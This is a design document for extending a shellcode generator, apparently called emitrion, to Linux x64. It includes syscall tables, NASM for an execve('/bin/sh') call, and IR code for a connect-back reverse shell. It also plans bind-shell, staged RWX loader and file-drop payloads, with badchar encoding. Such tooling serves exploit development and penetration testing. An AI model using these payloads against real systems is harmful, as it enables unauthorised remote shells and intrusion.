# Design: Linux x64 Shellcode Support

## Overview

Add Linux x64 as a second target OS for emitrion. Linux shellcode uses direct
syscalls (no PEB walk, no DLL loading, no hash-based API resolution). This
makes the runtime simpler but requires a parallel backend that shares the IR
structure while replacing the Win32-specific lowering with syscall sequences.

## Architecture Comparison

| Concern | Windows x64 | Linux x64 |
|---------|-------------|-----------|
| Function dispatch | PEB walk, hash resolution, indirect call via pointer | Direct `syscall` instruction |
| Calling convention | RCX, RDX, R8, R9, stack | RAX (number), RDI, RSI, RDX, R10, R8, R9 |
| Module loading | LoadLibraryA for non-kernel32 DLLs | N/A (kernel handles everything) |
| String construction | Stack-constructed, badchar-safe | Same (reusable) |
| Structure init | Same | Same (but different struct layouts: sockaddr_in is identical, but no STARTUPINFOA/PROCESS_INFORMATION) |
| Stack frame | RSP-relative, shadow space, 16-byte aligned | RSP-relative, no shadow space, 16-byte aligned at `call` |
| Badchar encoding | XOR-mask pairs for immediates | Same (reusable) |
| Framework stubs | ~220 lines (PEB walk, export parser, hash resolver) | 0 lines (no framework needed) |

## New IR Node: `Syscall`

The existing `CallAPI` node is tightly coupled to Win32: the api_database maps
function names to DLLs, the backend resolves them through the PEB walk, and
calls go through stored function pointers. Linux has none of this machinery.

```python
# workflow/ir.py -- new node

@dataclass(frozen=True)
class Syscall:
    """Invoke a Linux syscall by number with explicit ordered arguments.

    Arguments are in source order. The backend places them into
    RDI, RSI, RDX, R10, R8, R9 (the Linux syscall convention).
    The syscall number goes into RAX.
    """
    number: int             # e.g. 59 for execve on x86_64
    arguments: tuple[ValueRef, ...]
    result: str | None = None   # name to store RAX into (if needed)
```

This sits alongside `CallAPI` in the `Operation` union. The validator accepts
either `CallAPI` or `Syscall` depending on the target OS. The x86 and x64
Windows backends ignore `Syscall`; the Linux backend ignores `CallAPI`.

The `Operation` union becomes:

```python
Operation = (
    DefineConstant | ConstructString | AllocateLocal | AllocateStruct
    | ZeroStruct | WriteStructField | StoreLocal
    | CallAPI | Syscall | Compare | Jump | Terminate | CallBuffer
)
```

### Why not reuse CallAPI with a syscall database?

`CallAPI` carries a function name that resolves to a DLL, a hash, and a stored
pointer. Repurposing it for syscalls would require the api_database to know
about Linux syscalls (conflating two unrelated concepts) and the backend to
branch on target OS inside every lowering path. A dedicated node keeps both
backends simple and the IR self-documenting.

## New Module: `syscall_database.py`

A static registry parallel to `api_database.py`, mapping syscall names to
their numbers and argument descriptors.

```python
# syscall_database.py

@dataclass(frozen=True)
class SyscallRecord:
    name: str
    number: int     # x86_64 syscall number
    arguments: tuple[SyscallArg, ...]
    returns: SyscallReturn | None

@dataclass(frozen=True)
class SyscallArg:
    name: str
    register: str   # rdi, rsi, rdx, r10, r8, r9

@dataclass(frozen=True)
class SyscallReturn:
    type_name: str
    success: SyscallSuccessPredicate

SYSCALL_DATABASE: dict[str, SyscallRecord] = {
    "read":    SyscallRecord("read",    0,  ...),
    "write":   SyscallRecord("write",   1,  ...),
    "open":    SyscallRecord("open",    2,  ...),
    "close":   SyscallRecord("close",   3,  ...),
    "socket":  SyscallRecord("socket",  41, ...),
    "connect": SyscallRecord("connect", 42, ...),
    "accept":  SyscallRecord("accept",  43, ...),
    "bind":    SyscallRecord("bind",    49, ...),
    "listen":  SyscallRecord("listen",  50, ...),
    "dup2":    SyscallRecord("dup2",    33, ...),
    "execve":  SyscallRecord("execve",  59, ...),
    "exit":    SyscallRecord("exit",    60, ...),
    "mmap":    SyscallRecord("mmap",    9,  ...),
    "mprotect":SyscallRecord("mprotect",10, ...),
}
```

Initial milestone: only the syscalls needed for `execve_shell` and
`reverse_shell`. More can be added incrementally.

## New Module: `stack_alloc_linux_x64.py`

A simplified x64 stack allocator. Linux shellcode has no module bases, no API
pointer slots, and no shadow space. The zones reduce to:

```
Zone 0: Variables (8 bytes each)
Zone 1: Structures (sockaddr_in, etc.)
Zone 2: Strings (8-byte aligned)
```

The allocator takes a manifest and produces a `StackLayoutLinuxX64` with the
same `slot(name)` interface as `StackLayoutX64`. This keeps the backend
lowering code structurally identical.

```python
class SlotLinuxX64:
    name: str
    offset: int     # RSP-relative
    size: int
    category: Literal["variable", "structure", "string"]

    @property
    def rsp_ref(self) -> str:
        return f"[rsp+0x{self.offset:02x}]"

class StackLayoutLinuxX64:
    def slot(self, name: str) -> SlotLinuxX64: ...
    def slots_by_category(self, category: str) -> list[SlotLinuxX64]: ...
    @property
    def frame_size(self) -> int: ...
```

No shadow space, no export context reserve. Frame size is just the sum of
all slots, 16-byte aligned.

## New Module: `workflow/linux_x64_backend.py`

Parallel to `x64_backend.py`. Lowers the same IR `Workflow` structure but:

- `Syscall` nodes become: load args into RDI/RSI/RDX/R10/R8/R9, load number
  into RAX, execute `syscall`, optionally store RAX result.
- `CallAPI` nodes raise an error (wrong target).
- `ConstructString`, `AllocateLocal`, `AllocateStruct`, `ZeroStruct`,
  `WriteStructField`, `StoreLocal` lower identically to `x64_backend.py`
  (stack writes via RSP-relative offsets). These can be extracted into shared
  helpers.
- `Compare`, `Jump`, `Terminate`, `CallBuffer` lower identically.

### Syscall lowering example

```nasm
; Syscall: execve("/bin/sh", NULL, NULL)
    lea  rdi, [rsp+0x10]     ; filename pointer
    xor  esi, esi             ; argv = NULL
    xor  edx, edx             ; envp = NULL
    xor  eax, eax
    mov  al, 59               ; __NR_execve
    syscall
```

### Shared lowering helpers

Extract from `x64_backend.py` into `workflow/lowering_common_x64.py`:

- `_lower_construct_string()` -- stack string construction
- `_lower_zero_struct()` -- struct zeroing
- `_lower_write_struct_field()` -- struct field writes
- `_lower_store_local()` -- local variable stores
- `_lower_compare()` -- flag-based branching
- `_lower_jump()` -- unconditional jumps
- `_lower_terminate()` -- hang loops
- `_lower_call_buffer()` -- jump to buffer
- `_resolve_value()` -- ValueRef to register/immediate

Both `x64_backend.py` and `linux_x64_backend.py` import these. The
Windows backend adds `_lower_call_api()` (indirect call via stored pointer);
the Linux backend adds `_lower_syscall()` (direct syscall instruction).

## New Module: `build_linux_x64.py`

Orchestrator parallel to `build_x64.py`. The pipeline is shorter because
there is no PEB walk, no API resolution, no DLL loading:

```
manifest.yaml
  -> schema.py (load/validate, os=linux, arch=x64)
  -> stack_alloc_linux_x64.py (assign offsets)
  -> build_linux_x64.py:compose_asm_linux_x64() orchestrates:
       1. String construction (reuse _emit_strings_x64 or equivalent)
       2. Structure initialization
       3. Payload assembly (linux_x64_backend lowers workflow)
  -> build_common.py:_assemble_aligned() (Keystone x64 or NASM)
  -> doc_gen (contract.md with stack map, syscall table)
```

The `compose_asm_linux_x64()` function:

```python
def compose_asm_linux_x64(manifest, layout, manifest_path, template, config):
    parts = [
        "[BITS 64]",
        "; AUTO-GENERATED by emitter-v1 (linux-x64)",
        "",
        "_start:",
        "    ; Establish stack frame",
        "    mov  rbp, rsp",
        "    and  rsp, -16",
        *_emit_stack_reserve(layout.frame_size, badchars),
        "",
        "; -- String Construction --",
        _emit_strings_linux_x64(manifest, layout),
        "",
        "; -- Structure Initialization --",
        "; (handled by workflow IR ZeroStruct operations)",
        "",
        "; -- Payload --",
        template.emit(layout, config),
        "",
    ]
    return "\n".join(parts)
```

No framework stubs. No trampoline. No API resolution. No DLL loading blocks.
Roughly 50-70% less boilerplate than the Windows orchestrator.

### Debug runner

Linux shellcode runs natively. The debug runner uses `mmap` + `mprotect` to
allocate RWX memory, copies the shellcode in, and jumps to it:

```python
# Inline C via ctypes, or a small C wrapper, or just:
# mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
# memcpy(ptr, shellcode, len)
# ((void(*)())ptr)()
```

Or more practically, a small C file compiled with `gcc -z execstack`.

## Manifest Changes

### Schema additions

The `os` field already exists in manifests (defaults to "windows"). Linux
manifests set `os: linux`:

```yaml
arch: x64
os: linux
template: ir_linux_execve_shell
badchars: ["00", "0A", "0D"]
```

No `functions:` field (no Win32 APIs). No `strings:` for DLL names.
Variables and strings still work the same way.

### Validation

`schema.py` already knows about `TargetOS.LINUX`. The `load()` function needs:

1. Skip Win32 API validation when `os != windows`
2. Accept Linux template names
3. Skip MODULE_LOAD_ORDER checks

### Template registration

Add Linux templates to `CANONICAL_TEMPLATES` in `schema.py` and to the
`_load_template()` registry in `build_common.py`.

## arch.py Changes

Add Linux calling convention:

```python
class CallingConvention(Enum):
    WINDOWS_X86_STDCALL = "windows_x86_stdcall"
    WINDOWS_X64 = "windows_x64"
    LINUX_X64_SYSCALL = "linux_x64_syscall"
```

Update `TargetSpec.calling_convention` to return `LINUX_X64_SYSCALL` for
Linux x64.

Update `TargetSpec.is_currently_supported` to include Linux x64.

## Reference Workflows (Milestone 1)

### 1. `ir_linux_execve_shell`

The simplest possible Linux shellcode: `execve("/bin/sh", NULL, NULL)`.

```python
def build_linux_execve_shell_workflow() -> Workflow:
    return Workflow(
        name="ir_linux_execve_shell",
        blocks=(
            Block("entry", (
                ConstructString("shell", "/bin/sh"),
                Syscall(
                    number=59,  # __NR_execve
                    arguments=(
                        AddressOf("shell"),
                        Immediate(0),   # argv = NULL
                        Immediate(0),   # envp = NULL
                    ),
                ),
                Terminate(TerminateStyle.HANG),
            )),
        ),
        entry="entry",
    )
```

### 2. `ir_linux_reverse_shell`

Connect-back shell: socket, connect, dup2 x3, execve.

```python
def build_linux_reverse_shell_workflow(
    lhost: str = "127.0.0.1",
    lport: int = 4444,
) -> Workflow:
    return Workflow(
        name="ir_linux_reverse_shell",
        blocks=(
            Block("entry", (
                # socket(AF_INET=2, SOCK_STREAM=1, 0)
                Syscall(41, (Immediate(2), Immediate(1), Immediate(0)),
                        result="sockfd"),

                # Build sockaddr_in on the stack
                AllocateStruct("addr", "sockaddr_in_linux"),
                ZeroStruct("addr"),
                WriteStructField("addr", "sin_family", Immediate(2)),
                WriteStructField("addr", "sin_port", Input("lport_be")),
                WriteStructField("addr", "sin_addr", Input("lhost_be")),

                # connect(sockfd, &addr, 16)
                Syscall(42, (NameRef("sockfd"), AddressOf("addr"),
                             Immediate(16)),
                        result="conn_ret"),
                Compare("conn_ret", SuccessPredicate.ZERO,
                        true_block="dup_loop", false_block="fail"),
            )),
            Block("dup_loop", (
                # dup2(sockfd, 2), dup2(sockfd, 1), dup2(sockfd, 0)
                Syscall(33, (NameRef("sockfd"), Immediate(2))),
                Syscall(33, (NameRef("sockfd"), Immediate(1))),
                Syscall(33, (NameRef("sockfd"), Immediate(0))),
                Jump("exec"),
            )),
            Block("exec", (
                ConstructString("shell", "/bin/sh"),
                Syscall(59, (AddressOf("shell"), Immediate(0),
                             Immediate(0))),
                Terminate(TerminateStyle.HANG),
            )),
            Block("fail", (
                # exit(1)
                Syscall(60, (Immediate(1),)),
                Terminate(TerminateStyle.HANG),
            )),
        ),
        entry="entry",
    )
```

## Reference Workflows (Milestone 2)

- `ir_linux_bind_shell` -- bind, listen, accept, dup2, execve
- `ir_linux_staged_socket` -- socket, connect, mmap RWX, read into buffer,
  jump to buffer (staged payload)
- `ir_linux_exec_command` -- execve with argv construction for arbitrary
  commands (`/bin/sh -c "command"`)
- `ir_linux_file_write` -- open, write, close (drop a file to disk)

## WorkflowTemplate Adapter Changes

`WorkflowTemplate.emit()` currently dispatches on `config.effective_target.arch`.
It needs a second dispatch axis for OS:

```python
def emit(self, layout, config):
    target = config.effective_target
    if target.os is TargetOS.LINUX:
        if target.arch is Arch.X64:
            return lower_workflow_linux_x64(workflow, layout, config.badchars, config)
        raise ValueError(f"Linux {target.arch.value} not supported")
    if target.arch is Arch.X64:
        return lower_workflow_x64(workflow, layout, config.badchars, config)
    return lower_workflow(workflow, layout, config.badchars, config)
```

## Requirement Extraction

`WorkflowTemplate` currently extracts manifest requirements (functions,
strings, structs) from the IR for Win32. Linux workflows have no `functions`
but still have strings and structs. The extraction logic in `_extract_slots()`
and `_merge_template_requirements()` needs to handle `Syscall` nodes
(no function lookup, but still collect string/struct/variable refs from
arguments).

## Encoding and Badchars

The `encode_x64.py` module is OS-agnostic. XOR-mask pairs, safe memory stores,
and displacement checks work identically for Linux x64 shellcode. No changes
needed.

## Testing Strategy

### Unit tests (run on Mac, no assembler)

1. `test_syscall_database.py` -- verify all syscall numbers and arg registers
2. `test_stack_alloc_linux_x64.py` -- zone layout, frame alignment, no overlaps
3. `test_linux_x64_backend.py` -- lower each operation type, verify assembly text
4. `test_linux_workflows.py` -- build each workflow with `assemble=False`, verify
   ASM contains expected patterns (syscall instructions, correct registers)
5. `test_build_linux_x64.py` -- end-to-end `build_linux_x64()` with
   `assemble=False`

### Integration tests (Linux VM with Keystone)

6. Full assembly + badchar validation
7. Shellcode execution in controlled environment

## File Layout (new files)

```
emitrion/
  syscall_database.py              # Syscall records for Linux x86_64
  stack_alloc_linux_x64.py         # Simplified stack allocator
  build_linux_x64.py               # Linux x64 build orchestrator
  workflow/
    linux_x64_backend.py           # Workflow IR -> Linux x64 ASM
    lowering_common_x64.py         # Shared helpers (extracted from x64_backend)
  manifests/
    linux-x64/
      execve_shell_x64.yaml
      revshell_x64.yaml
  tests/
    test_syscall_database.py
    test_stack_alloc_linux_x64.py
    test_linux_x64_backend.py
    test_linux_workflows.py
```

## Implementation Order

**Phase 1: Foundation (this session, if approved)**
1. `Syscall` IR node in `ir.py`
2. `syscall_database.py` with initial syscalls
3. `stack_alloc_linux_x64.py`
4. `arch.py` updates (calling convention, supported target)
5. `schema.py` updates (Linux template names, skip Win32 validation)

**Phase 2: Backend**
6. Extract shared helpers into `lowering_common_x64.py`
7. `linux_x64_backend.py`
8. `build_linux_x64.py` orchestrator

**Phase 3: Workflows + Testing**
9. `ir_linux_execve_shell` workflow + template
10. `ir_linux_reverse_shell` workflow + template
11. Manifests
12. Full test suite

**Phase 4: Polish**
13. CLI entry point (`emitrion-linux-x64`)
14. Contract/doc generation for Linux builds
15. Debug runner for Linux
16. Milestone 2 workflows

## Risks and Open Questions

1. **Shared helper extraction**: Refactoring `x64_backend.py` to extract shared
   lowering code is the riskiest change, since it touches the working Windows
   pipeline. Alternative: duplicate the helpers initially, extract later once
   both backends are stable.

2. **Badchar encoding in syscall numbers**: Some syscall numbers (e.g. 0 for
   `read`) contain 0x00. The existing `encode_dword_into_r64` handles this,
   but the syscall number load path needs to use it.

3. **sockaddr_in layout**: Identical on Linux and Windows (same struct, same
   offsets). Can reuse the existing `sockaddr_in` StructRecord. Only need
   Linux-specific structs if we add workflows that use them.

4. **NULL argv for execve**: `execve("/bin/sh", NULL, NULL)` works on most
   Linux kernels but is technically non-POSIX. A more robust version would
   construct `argv = {"/bin/sh", NULL}` on the stack. Consider supporting both.

5. **Linux x86 (32-bit)**: Deferred. `int 0x80` with different register
   convention (EAX, EBX, ECX, EDX, ESI, EDI). Can be added later with the
   same pattern (new backend, new stack allocator).
